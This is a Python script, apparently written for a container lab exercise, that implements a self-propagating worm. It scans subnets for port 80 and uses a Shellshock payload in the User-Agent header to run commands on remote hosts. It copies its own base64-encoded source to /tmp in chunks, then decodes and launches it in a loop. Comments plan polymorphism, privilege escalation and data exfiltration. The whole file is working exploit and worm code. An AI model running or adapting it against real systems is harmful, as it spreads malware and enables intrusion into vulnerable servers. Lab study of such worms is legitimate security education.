#!/usr/bin/env python3
import time
import os
import urllib.request
import urllib.error
import base64

# Configuration   #must be changed to a real scan
SUBNETS = [
    "172.28.1", 
    "172.28.2",  
    "172.28.3",
    "172.28.4",
]

TARGET_SCRIPT = "/cgi-bin/status.cgi"  #for the shellshock
REMOTE_WORM_PATH = "/tmp/worm.py"
REMOTE_B64_PATH = "/tmp/worm.b64"
CHUNK_SIZE = 4000

import socket  #c must have a similar library

def scan_target(ip):
    """
    Scans the target IP for port 80 using socket.
    Returns True if port 80 is open, False otherwise.
    """
    print("[*] Scanning {} for port 80...".format(ip))
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, 80))
        sock.close()
        if result == 0:
            return True
        return False
    except Exception as e:
        print("[-] Error scanning {}: {}".format(ip, e))
        return False

def run_exploit(ip, command):  #execute a command on the target via shellshock
    """
    Executes a command on the target via Shellshock.
    """
    target_url = "http://{}:80{}".format(ip, TARGET_SCRIPT)
    # Shellshock payload
    payload = "() {{ :; }}; /bin/bash -c '{}'".format(command)
    headers = {
        "User-Agent": payload
    }
    try:
        req = urllib.request.Request(target_url, headers=headers)
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.read().decode('utf-8')
    except urllib.error.HTTPError as e:
        # 500 errors are expected if we don't output headers, but command might have run
        return e.read().decode('utf-8')
    except Exception as e:
        # print("[-] Exploit error on {}: {}".format(ip, e))
        return None

def infect_target(ip):
    """
    Infects the target by uploading and executing this worm.
    """
    if not scan_target(ip):
        return False

    print("[+] Web Server found at {}!".format(ip))
    print("[*] Attempting infection on {} via Shellshock...".format(ip))

    # 1. Read own source code -> Self-replication
    try:
        with open(os.path.abspath(__file__), "rb") as f:
            worm_content = f.read()
            #worm_content = polimorfism(worm_content) -> to be done
        b64_content = base64.b64encode(worm_content).decode('utf-8')
    except Exception as e:
        print("[-] Error reading own source: {}".format(e))
        return False

    # 2. Check if already infected (simple check)
    # We try to ls the worm file. If it exists, we skip.
    check = run_exploit(ip, "echo 'Content-type: text/plain'; echo; /bin/ls {}".format(REMOTE_WORM_PATH))
    if check and REMOTE_WORM_PATH in check:
        print("[*] Target {} already infected.".format(ip))
        return True

    # 3. Clean up remote files -> Self-destruction, but if we change the CVE it must be changed
    #run_exploit(ip, "rm -f {} {}".format(REMOTE_B64_PATH, REMOTE_WORM_PATH))

    # 4. Upload in chunks  -> slice the worm code (the header used in the exploit have a maximum size) and upload it to the infected target 
    print("[*] Uploading worm ({} bytes)...".format(len(b64_content)))
    for i in range(0, len(b64_content), CHUNK_SIZE):
        chunk = b64_content[i:i+CHUNK_SIZE]
        # Append chunk to remote b64 file
        cmd = "/bin/echo -n \"{}\" >> {}".format(chunk, REMOTE_B64_PATH)
        run_exploit(ip, cmd)

    # 5. Decode -> once the worm is there we decode it to get the original code
    print("[*] Decoding payload...")
    run_exploit(ip, "/usr/bin/base64 -d {} > {}".format(REMOTE_B64_PATH, REMOTE_WORM_PATH))

    # 6. Execute
    print("[+] Executing worm on {}...".format(ip))
    # We run it in background using nohup
    # We verify python3 exists first, though we assume it does based on checks
    cmd = "nohup python3 {} > /tmp/worm.log 2>&1 &".format(REMOTE_WORM_PATH)
    run_exploit(ip, cmd)
    
    print("[+] Infection command sent to {}".format(ip))
    return True



    #TODO: function scan_network(): return the list of victims that can be attacked 


    #TODO: function polimorfism(): add random bytes to make the worm code change without changint he functionality. And maybe can add more lab techniques to make it more complex


    #TODO: function priviledge_escalation(): try to escalate privileges to root if necessary and not done with the propagation
    #TODO: function data_exfiltration(): or the atack we want to finally do

def main():
    print("=== Python Shellshock Worm ===")
    
    # Delay to allow system to settle if just started
    time.sleep(2)
    
    #execute the attack to this machine, maybe can we decided with an args if we want to attack this machine or just used to propagate
    #priviledge_escalation() 
    #data_exfiltration()

    #infection loop
    while True:
        print("\n[*] Starting infection round...")
        
        #SUBNETS = scan_network() -> to be done
        for subnet in SUBNETS:
            # Try hosts .2 and .3
            for host in range(2, 4):
                ip = "{}.{}".format(subnet, host)
                # Skip self (simple check, not robust for all network configs but good enough)
                # In a real worm we'd check interfaces.
                infect_target(ip)
        
        print("[*] Round complete. Sleeping 20 seconds...")
        time.sleep(20)

if __name__ == "__main__":
    main()



#to try @hassan, to grant no external access to the containers outside its network: 
#networks:
#  net_1_2:
#    driver: bridge
#    internal: true